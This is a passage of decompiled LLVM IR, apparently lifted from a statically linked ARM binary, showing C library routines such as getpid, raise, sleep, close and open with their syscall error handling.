  %v0_13f6c = phi i32 [ %v0_13f68, %dec_label_pc_13f68 ], [ %v2_13f4818, %dec_label_pc_13f3c ], [ %v2_13f48, %dec_label_pc_13f54.dec_label_pc_13f48_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13f6c = icmp eq i32 %v0_13f6c, 0
  %v0_13f90.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_13f6c, label %dec_label_pc_13f8c, label %dec_label_pc_13f74

dec_label_pc_13f74:                               ; preds = %dec_label_pc_13f6c
  store i32 %v0_13f90.pre, i32* %r0.global-to-local, align 4
  %v0_13f78 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f78 = add i32 %v0_13f78, 126
  store i32 %v1_13f78, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13f8c

dec_label_pc_13f8c:                               ; preds = %dec_label_pc_13f6c, %dec_label_pc_13f74
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_13f90.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_13f9828 = inttoptr i32 %v0_13f90.pre to i32*
  %v2_13f9829 = load i32, i32* %v1_13f9828, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_13f9c36 = icmp eq i32 %v2_13f9829, 0
  br i1 %v9_13f9c36, label %dec_label_pc_13fa4, label %dec_label_pc_13fbc

dec_label_pc_13fa4:                               ; preds = %dec_label_pc_13f8c, %dec_label_pc_13fa4.dec_label_pc_13f98_crit_edge
  %v0_13fa437 = phi i32 [ %v1_13f9c.pre, %dec_label_pc_13fa4.dec_label_pc_13f98_crit_edge ], [ 0, %dec_label_pc_13f8c ]
  store i32 %v0_13fa437, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13fb4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13fb4, label %dec_label_pc_13fb8, label %dec_label_pc_13fa4.dec_label_pc_13f98_crit_edge

dec_label_pc_13fa4.dec_label_pc_13f98_crit_edge:  ; preds = %dec_label_pc_13fa4
  %v0_13f98.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13f9c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13f98 = inttoptr i32 %v0_13f98.pre to i32*
  %v2_13f98 = load i32, i32* %v1_13f98, align 4
  %v3_13f9c = icmp uge i32 %v2_13f98, %v1_13f9c.pre
  store i1 %v3_13f9c, i1* %cpsr_c.global-to-local, align 1
  %v9_13f9c = icmp eq i32 %v2_13f98, %v1_13f9c.pre
  br i1 %v9_13f9c, label %dec_label_pc_13fa4, label %dec_label_pc_13fbc

dec_label_pc_13fb8:                               ; preds = %dec_label_pc_13fa4
  %v0_13fb8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13fbc

dec_label_pc_13fbc:                               ; preds = %dec_label_pc_13f8c, %dec_label_pc_13fa4.dec_label_pc_13f98_crit_edge, %dec_label_pc_13fb8
  %v0_13fbc = phi i32 [ %v0_13fb8, %dec_label_pc_13fb8 ], [ %v2_13f9829, %dec_label_pc_13f8c ], [ %v2_13f98, %dec_label_pc_13fa4.dec_label_pc_13f98_crit_edge ]
  %v1_13fbc = phi i32 [ %v0_13fb8, %dec_label_pc_13fb8 ], [ 0, %dec_label_pc_13f8c ], [ %v1_13f9c.pre, %dec_label_pc_13fa4.dec_label_pc_13f98_crit_edge ]
  %v3_13fbc = icmp uge i32 %v0_13fbc, %v1_13fbc
  store i1 %v3_13fbc, i1* %cpsr_c.global-to-local, align 1
  %v9_13fbc = icmp eq i32 %v0_13fbc, %v1_13fbc
  br i1 %v9_13fbc, label %dec_label_pc_13fc4, label %dec_label_pc_13fbc.dec_label_pc_13f3c_crit_edge

dec_label_pc_13fbc.dec_label_pc_13f3c_crit_edge:  ; preds = %dec_label_pc_13fbc
  %v0_13f40.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13f3c

dec_label_pc_13fc4:                               ; preds = %dec_label_pc_13fbc
  %v2_13fc4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13fc4, i32* %r4.global-to-local, align 4
  %v1_13fc8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13fc8

; uselistorder directives
  uselistorder i32 %v0_13fb8, { 1, 0 }
  uselistorder i32 %v1_13f9c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_13f4c.pre, { 2, 1, 0 }
  uselistorder i32 %v2_13f4818, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 0, 5, 7, 6, 1 }
  uselistorder i32 126, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13fbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13fa4, { 1, 0 }
  uselistorder label %dec_label_pc_13f8c, { 1, 0 }
  uselistorder label %dec_label_pc_13f6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13f54, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13fcc = load i32, i32* @r7, align 4
  store i32 %v3_13fcc, i32* %stack_var_-8, align 4
  %v0_13fd0 = call i32 @__aeabi_read_tp()
  store i32 %v0_13fd0, i32* %r0.global-to-local, align 4
  %v1_13fd4 = add i32 %v0_13fd0, -1060
  %v2_13fd4 = inttoptr i32 %v1_13fd4 to i32*
  %v3_13fd4 = load i32, i32* %v2_13fd4, align 4
  %tmp7 = icmp slt i32 %v3_13fd4, 1
  br i1 %tmp7, label %dec_label_pc_13fe4, label %dec_label_pc_14008

dec_label_pc_13fe4:                               ; preds = %entry
  %v2_13fd8 = icmp eq i32 %v3_13fd4, 0
  br i1 %v2_13fd8, label %dec_label_pc_13fe8, label %dec_label_pc_13ff4

dec_label_pc_13fe8:                               ; preds = %dec_label_pc_13fe4
  %v1_13fe8 = add i32 %v0_13fd0, -1064
  %v2_13fe8 = inttoptr i32 %v1_13fe8 to i32*
  %v3_13fe8 = load i32, i32* %v2_13fe8, align 4
  store i32 %v3_13fe8, i32* %r0.global-to-local, align 4
  %v2_13fec = icmp eq i32 %v3_13fe8, 0
  br i1 %v2_13fec, label %bb, label %bb8

dec_label_pc_13ff4:                               ; preds = %dec_label_pc_13fe4
  br label %bb8

bb:                                               ; preds = %dec_label_pc_13fe8
  store i32 0, i32* %v2_13fe8, align 4
  %v0_14004.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_13ff4, %dec_label_pc_13fe8, %bb
  %v0_14004 = phi i32 [ %v3_13fe8, %dec_label_pc_13fe8 ], [ %v0_13fd0, %dec_label_pc_13ff4 ], [ %v0_14004.pre, %bb ]
  br label %dec_label_pc_14008

dec_label_pc_14008:                               ; preds = %entry, %bb8
  %v0_14008 = phi i32 [ %v3_13fd4, %entry ], [ %v0_14004, %bb8 ]
  store i32 %v0_14008, i32* %r0.global-to-local, align 4
  %v2_1400c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1400c, i32* @r7, align 4
  ret i32 %v0_14008

; uselistorder directives
  uselistorder i32 %v0_14008, { 1, 0 }
  uselistorder i32 %v3_13fd4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14008, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14014 = load i32, i32* @r4, align 4
  store i32 %v3_14014, i32* %stack_var_-20, align 4
  %v0_1401c = call i32 @__aeabi_read_tp()
  store i32 %v0_1401c, i32* %r0.global-to-local, align 4
  %v1_14020 = add i32 %v0_1401c, -1064
  %v2_14020 = inttoptr i32 %v1_14020 to i32*
  %v3_14020 = load i32, i32* %v2_14020, align 4
  store i32 %v3_14020, i32* %r4.global-to-local, align 4
  %v2_14024 = icmp eq i32 %v3_14020, 0
  %v1_1402c = add i32 %v0_1401c, -1060
  %v2_1402c = inttoptr i32 %v1_1402c to i32*
  %v3_1402c = load i32, i32* %v2_1402c, align 4
  store i32 %v3_1402c, i32* %r0.global-to-local, align 4
  br i1 %v2_14024, label %dec_label_pc_14034, label %dec_label_pc_14048

dec_label_pc_14034:                               ; preds = %entry
  store i32 %v3_1402c, i32* %r4.global-to-local, align 4
  store i32 %v3_1402c, i32* %v2_14020, align 4
  %v0_14070.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_14048:                               ; preds = %entry
  %v5_1404c = icmp sgt i32 %v3_1402c, 0
  br i1 %v5_1404c, label %bb28, label %dec_label_pc_14050

dec_label_pc_14050:                               ; preds = %dec_label_pc_14048
  %tmp = bitcast i32 %v3_1402c to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_14050 = bitcast float %tmp30 to i32
  %v2_14054 = icmp eq i32 %v1_14050, 0
  br i1 %v2_14054, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14050
  store i32 %v3_14020, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_14050
  %v2_1405c = sub i32 0, %v3_1402c
  store i32 %v2_1405c, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_14048, %dec_label_pc_14034, %.thread
  %v0_14074 = phi i32 [ %v3_1402c, %dec_label_pc_14048 ], [ %v0_14070.pre, %dec_label_pc_14034 ], [ %v3_14020, %bb ], [ %v2_1405c, %.thread ]
  store i32 %v0_14074, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_14074, -4095
  br i1 %tmp31, label %dec_label_pc_14098, label %dec_label_pc_14080

dec_label_pc_14080:                               ; preds = %bb28
  %v0_14084 = call i32 @__aeabi_read_tp()
  %v3_14088 = load i16, i16* @global_var_21a38.351, align 2
  %v4_14088 = sext i16 %v3_14088 to i32
  %v0_1408c = load i32, i32* %r2.global-to-local, align 4
  %v1_1408c = sub i32 0, %v0_1408c
  store i32 %v1_1408c, i32* %r2.global-to-local, align 4
  %v3_14090 = add i32 %v4_14088, %v0_14084
  %v4_14090 = inttoptr i32 %v3_14090 to i32*
  store i32 %v1_1408c, i32* %v4_14090, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14098

dec_label_pc_14098:                               ; preds = %bb28, %dec_label_pc_14080
  %v0_1409c = phi i32 [ %v0_14074, %bb28 ], [ -1, %dec_label_pc_14080 ]
  %v3_14098 = icmp eq i32 %v0_1409c, -1
  store i32 %v0_1409c, i32* %r5.global-to-local, align 4
  br i1 %v3_14098, label %dec_label_pc_140a4, label %dec_label_pc_140ec

dec_label_pc_140a4:                               ; preds = %dec_label_pc_14098
  %v0_140a8 = call i32 @__aeabi_read_tp()
  store i32 %v0_140a8, i32* %r0.global-to-local, align 4
  %v3_140ac = load i16, i16* @global_var_21a38.351, align 2
  %v4_140ac = sext i16 %v3_140ac to i32
  %v2_140b0 = add i32 %v4_140ac, %v0_140a8
  %v3_140b0 = inttoptr i32 %v2_140b0 to i32*
  %v4_140b0 = load i32, i32* %v3_140b0, align 4
  %v7_140b4 = icmp eq i32 %v4_140b0, 38
  br i1 %v7_140b4, label %dec_label_pc_140c0, label %dec_label_pc_140a4.dec_label_pc_140ec_crit_edge

dec_label_pc_140a4.dec_label_pc_140ec_crit_edge:  ; preds = %dec_label_pc_140a4
  %v0_140ec.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_140ec

dec_label_pc_140c0:                               ; preds = %dec_label_pc_140a4
  %v0_140c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_140c0, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_140c0, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_140c0
  %v5_140d8 = sub i32 0, %v0_140c0
  store i32 %v5_140d8, i32* %r2.global-to-local, align 4
  %v7_140dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_140e4.526 to i32), i32 55636) to i32*), align 4
  %v4_140e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_140e0, i32* %r0.global-to-local, align 4
  %v7_140e4 = add i32 %v7_140dc, %v0_140a8
  %v8_140e4 = inttoptr i32 %v7_140e4 to i32*
  store i32 %v5_140d8, i32* %v8_140e4, align 4
  %v0_140e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_140c0, %bb29
  %v0_140e8 = phi i32 [ %v0_140e8.pre, %bb29 ], [ %v0_140c0, %dec_label_pc_140c0 ]
  store i32 %v0_140e8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_140ec

dec_label_pc_140ec:                               ; preds = %dec_label_pc_140a4.dec_label_pc_140ec_crit_edge, %dec_label_pc_14098, %.thread22
  %v0_140ec = phi i32 [ %v0_140ec.pre, %dec_label_pc_140a4.dec_label_pc_140ec_crit_edge ], [ %v0_1409c, %dec_label_pc_14098 ], [ %v0_140e8, %.thread22 ]
  store i32 %v0_140ec, i32* %r0.global-to-local, align 4
  %v2_140f0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_140f0, i32* @r4, align 4
  ret i32 %v0_140ec

; uselistorder directives
  uselistorder i32 %v0_140ec, { 1, 0 }
  uselistorder i32 %v0_140c0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14074, { 2, 0, 1 }
  uselistorder i32 %v3_1402c, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_140ec, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_14098, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_14104 = load i32, i32* @r4, align 4
  %v6_14104 = load i32, i32* @r5, align 4
  %v9_14104 = load i32, i32* @r6, align 4
  %v12_14104 = load i32, i32* @r7, align 4
  %v15_14104 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14114 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_14114, label %dec_label_pc_14128, label %dec_label_pc_1419c

dec_label_pc_14128:                               ; preds = %entry
  %v0_14128 = call i32 @__aeabi_read_tp()
  %v1_1412c = add i32 %v0_14128, -1036
  %v2_1412c = inttoptr i32 %v1_1412c to i32*
  %v3_1412c = load i32, i32* %v2_1412c, align 4
  %v1_14130 = and i32 %v3_1412c, -71
  %v2_14134 = icmp ugt i32 %v1_14130, 7
  store i1 %v2_14134, i1* %cpsr_c.global-to-local, align 1
  %v7_14134 = icmp eq i32 %v1_14130, 8
  %v1_14138 = add i32 %v0_14128, -1168
  store i32 %v1_14138, i32* @r5, align 4
  br i1 %v7_14134, label %dec_label_pc_14140, label %dec_label_pc_14214

dec_label_pc_14140:                               ; preds = %dec_label_pc_14128
  %v2_14144 = add i32 %v0_14128, -624
  %v3_14144 = inttoptr i32 %v2_14144 to i32*
  store i32 -1, i32* %v3_14144, align 4
  %v0_14148 = load i32, i32* @r5, align 4
  %v1_14148 = add i32 %v0_14148, 132
  store i32 %v1_14148, i32* @r6, align 4
  br label %dec_label_pc_1414c

dec_label_pc_1414c:                               ; preds = %dec_label_pc_14180.dec_label_pc_1414c_crit_edge, %dec_label_pc_14140
  %v0_14150 = phi i32 [ %v0_14150.pre, %dec_label_pc_14180.dec_label_pc_1414c_crit_edge ], [ %v1_14148, %dec_label_pc_14140 ]
  %v0_1414c = phi i32 [ %v0_14188, %dec_label_pc_14180.dec_label_pc_1414c_crit_edge ], [ %v0_14148, %dec_label_pc_14140 ]
  %v1_1414c = add i32 %v0_1414c, 132
  %v2_1414c = inttoptr i32 %v1_1414c to i32*
  %v3_1414c = load i32, i32* %v2_1414c, align 4
  store i32 %v0_14150, i32* %r2.global-to-local, align 4
  store i32 %v3_1414c, i32* @r4, align 4
  %v1_1415c30 = inttoptr i32 %v0_14150 to i32*
  %v2_1415c31 = load i32, i32* %v1_1415c30, align 4
  %v3_1416033 = icmp uge i32 %v2_1415c31, %v3_1414c
  store i1 %v3_1416033, i1* %cpsr_c.global-to-local, align 1
  %v9_1416039 = icmp eq i32 %v2_1415c31, %v3_1414c
  br i1 %v9_1416039, label %dec_label_pc_14168, label %dec_label_pc_14180

dec_label_pc_14168:                               ; preds = %dec_label_pc_1414c, %dec_label_pc_14168.dec_label_pc_1415c_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14178 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14178, label %dec_label_pc_1417c, label %dec_label_pc_14168.dec_label_pc_1415c_crit_edge

dec_label_pc_14168.dec_label_pc_1415c_crit_edge:  ; preds = %dec_label_pc_14168
  %v0_1415c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14160.pre = load i32, i32* @r4, align 4
  %v1_1415c = inttoptr i32 %v0_1415c.pre to i32*
  %v2_1415c = load i32, i32* %v1_1415c, align 4
  %v3_14160 = icmp uge i32 %v2_1415c, %v1_14160.pre
  store i1 %v3_14160, i1* %cpsr_c.global-to-local, align 1
  %v9_14160 = icmp eq i32 %v2_1415c, %v1_14160.pre
  br i1 %v9_14160, label %dec_label_pc_14168, label %dec_label_pc_14180

dec_label_pc_1417c:                               ; preds = %dec_label_pc_14168
  %v0_1417c = load i32, i32* @r4, align 4
  br label %dec_label_pc_14180

dec_label_pc_14180:                               ; preds = %dec_label_pc_1414c, %dec_label_pc_14168.dec_label_pc_1415c_crit_edge, %dec_label_pc_1417c
  %v0_14180 = phi i32 [ %v0_1417c, %dec_label_pc_1417c ], [ %v2_1415c31, %dec_label_pc_1414c ], [ %v2_1415c, %dec_label_pc_14168.dec_label_pc_1415c_crit_edge ]
  %v1_14180 = phi i32 [ %v0_1417c, %dec_label_pc_1417c ], [ %v3_1414c, %dec_label_pc_1414c ], [ %v1_14160.pre, %dec_label_pc_14168.dec_label_pc_1415c_crit_edge ]
  %v3_14180 = icmp uge i32 %v0_14180, %v1_14180
  store i1 %v3_14180, i1* %cpsr_c.global-to-local, align 1
  %v9_14180 = icmp eq i32 %v0_14180, %v1_14180
  br i1 %v9_14180, label %dec_label_pc_14188, label %dec_label_pc_14180.dec_label_pc_1414c_crit_edge

dec_label_pc_14180.dec_label_pc_1414c_crit_edge:  ; preds = %dec_label_pc_14180
  %v0_14188 = load i32, i32* @r5, align 4
  %v0_14150.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1414c

dec_label_pc_14188:                               ; preds = %dec_label_pc_14180
  %v0_14190 = load i32, i32* @r7, align 4
  %v2_14190 = add i32 %v0_14190, 116
  %v3_14190 = inttoptr i32 %v2_14190 to i32*
  %v4_14190 = load i32, i32* %v3_14190, align 4
  store i32 82332, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14190)
  %v0_141a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1419c

dec_label_pc_1419c:                               ; preds = %entry, %dec_label_pc_14188
  %v0_141a4 = phi i32 [ 0, %entry ], [ %v0_141a4.pre, %dec_label_pc_14188 ]
  %v2_141a8 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_141a8, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_141b4 = call i32 @__libc_sigaction(i32 17, i32 %v0_141a4, i32 %v2_141a8)
  %v3_141b8 = load i32, i32* %stack_var_-60, align 4
  %v2_141bc = icmp ne i32 %v3_141b8, 0
  store i1 %v2_141bc, i1* %cpsr_c.global-to-local, align 1
  %v7_141bc = icmp eq i32 %v3_141b8, 1
  br i1 %v7_141bc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1419c
  %v3_141c0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_141c0, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1419c, %bb
  call void @__pseudo_cond_branch(i1 %v7_141bc, i32 ptrtoint (i32* @global_var_10e24.530 to i32))
  %v2_141d0 = ptrtoint i32* %stack_var_-32 to i32
  %v2_141d8 = call i32 @__libc_nanosleep(i32 %v2_141d0, i32 %v2_141d0)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_141dc = icmp eq i32 %v2_141d8, 0
  br i1 %v2_141dc, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_141f0 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_141f0, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_14200 = load i32, i32* %stack_var_-40, align 4
  %v1_14204 = and i32 %v3_14200, 65536
  store i32 %v1_14204, i32* %r2.global-to-local, align 4
  %v2_14204 = icmp eq i32 %v1_14204, 0
  br i1 %v2_14204, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_1420c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_1420c, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_14204, i32 ptrtoint (i32* @global_var_10e24.530 to i32))
  br label %dec_label_pc_14214

dec_label_pc_14214:                               ; preds = %dec_label_pc_14128, %.thread5
  %v0_14214 = load i32, i32* @r4, align 4
  store i32 %v3_14104, i32* @r4, align 4
  store i32 %v6_14104, i32* @r5, align 4
  store i32 %v9_14104, i32* @r6, align 4
  store i32 %v12_14104, i32* @r7, align 4
  store i32 %v15_14104, i32* @lr, align 4
  ret i32 %v0_14214

; uselistorder directives
  uselistorder i32 %v0_1417c, { 1, 0 }
  uselistorder i32 %v1_14160.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14214, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1419c, { 1, 0 }
  uselistorder label %dec_label_pc_14180, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14168, { 1, 0 }
}

define i32 @function_14228(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14228:
  %v0_14228 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14228, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14228
  %v2_14228 = load i32, i32* @r4, align 4
  %v5_14230 = mul i32 %v2_14228, 524288
  %v6_14230 = and i32 %v5_14230, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14228, %bb
  %v7_14230 = phi i32 [ %arg1, %dec_label_pc_14228 ], [ %v6_14230, %bb ]
  ret i32 %v7_14230

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_14244 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14244, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14244 = load i32, i32* @r0, align 4
  ret i32 %v2_14244

bb1:                                              ; preds = %entry
  %v0_14248 = call i32 @__syscall_error()
  ret i32 %v0_14248
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14254 = load i32, i32* @global_var_24be0.533, align 4
  %v2_14258 = icmp eq i32 %v3_14254, 0
  store i1 %v2_14258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14258, label %dec_label_pc_14260, label %entry.dec_label_pc_1427c_crit_edge

entry.dec_label_pc_1427c_crit_edge:               ; preds = %entry
  %v3_1427c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1427c

dec_label_pc_14260:                               ; preds = %entry
  %v0_14260 = load i32, i32* @r7, align 4
  store i32 %v0_14260, i32* @ip, align 4
  %v0_14270 = load i32, i32* @r0, align 4
  %v2_14270 = icmp ugt i32 %v0_14270, -4097
  %v7_14270 = icmp eq i32 %v0_14270, -4096
  store i1 %v7_14270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14270, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_1427c, %bb8, %bb9, %dec_label_pc_14260
  %merge2 = phi i32 [ %v0_14270, %dec_label_pc_14260 ], [ %v0_142a0, %dec_label_pc_1427c ], [ %v0_142b0, %bb8 ], [ %v0_142b0, %bb9 ]
  ret i32 %merge2

bb7:                                              ; preds = %dec_label_pc_14260
  %v0_14278 = call i32 @__syscall_error()
  br label %dec_label_pc_1427c

dec_label_pc_1427c:                               ; preds = %entry.dec_label_pc_1427c_crit_edge, %bb7
  %v3_1427c = phi i32 [ %v3_1427c.pre, %entry.dec_label_pc_1427c_crit_edge ], [ %v0_14278, %bb7 ]
  %v9_1427c = load i32, i32* @r7, align 4
  store i32 %v9_1427c, i32* %stack_var_-8, align 4
  %v12_1427c = load i32, i32* @lr, align 4
  %v0_14280 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_14280, i32* @ip, align 4
  store i32 %v3_1427c, i32* @r7, align 4
  %v1_1429c = call i32 @__libc_disable_asynccancel(i32 %v0_14280)
  %v0_142a0 = load i32, i32* @r7, align 4
  store i32 %v0_142a0, i32* @r0, align 4
  %v2_142a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_142a4, i32* @r7, align 4
  store i32 %v12_1427c, i32* @lr, align 4
  %v2_142a8 = icmp ugt i32 %v0_142a0, -4097
  %v7_142a8 = icmp eq i32 %v0_142a0, -4096
  store i1 %v7_142a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142a8, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_1427c
  %v0_142b0 = call i32 @__syscall_error()
  %v0_142c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_142c0, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v3_142c0 = load i32, i32* @r1, align 4
  %v4_142c0 = inttoptr i32 %v3_142c0 to i32*
  store i32 %v0_142b0, i32* %v4_142c0, align 4
  %v5_142c0 = load i32, i32* @r4, align 4
  %v6_142c0 = load i32, i32* @r1, align 4
  %v7_142c0 = sub i32 %v6_142c0, %v5_142c0
  store i32 %v7_142c0, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_142b0, { 2, 1, 0 }
  uselistorder i32 %v0_142a0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14270, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1427c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_142d4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_142d4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_142d4 = load i32, i32* @r0, align 4
  ret i32 %v2_142d4

bb1:                                              ; preds = %entry
  %v0_142d8 = call i32 @__syscall_error()
  ret i32 %v0_142d8
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_142e4 = load i32, i32* @global_var_24be0.533, align 4
  %v2_142e8 = icmp eq i32 %v3_142e4, 0
  store i1 %v2_142e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142e8, label %dec_label_pc_142f0, label %entry.dec_label_pc_1430c_crit_edge

entry.dec_label_pc_1430c_crit_edge:               ; preds = %entry
  %v3_1430c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1430c

dec_label_pc_142f0:                               ; preds = %entry
  %v0_14300 = load i32, i32* @r0, align 4
  %v2_14300 = icmp ugt i32 %v0_14300, -4097
  %v7_14300 = icmp eq i32 %v0_14300, -4096
  store i1 %v7_14300, i1* %cpsr_z.global-to-local, align 1
